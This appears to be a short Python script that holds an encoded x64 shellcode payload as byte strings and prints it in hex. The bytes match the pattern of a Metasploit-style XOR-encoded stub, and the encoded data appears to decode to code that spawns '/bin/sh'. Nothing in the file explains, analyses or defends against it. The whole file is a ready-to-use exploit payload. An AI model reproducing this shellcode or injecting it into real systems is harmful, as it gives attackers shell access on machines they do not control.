import sys

buf = b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x26\x21\x87\xbd\x43"
buf += b"\xdb\x91\x8c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x6e\x99\xa8\xdf\x2a\xb5\xbe\xff\x4e"
buf += b"\x21\x1e\xed\x17\x84\xc3\xea\x4e\x0c\xe4\xe9\x1d"
buf += b"\x89\x79\x84\x26\x21\x87\x92\x21\xb2\xff\xa3\x55"
buf += b"\x49\x87\xeb\x14\x8f\xcf\xe6\x1d\x79\x88\xb8\x43"
buf += b"\xdb\x91\x8c"


print(buf.hex())
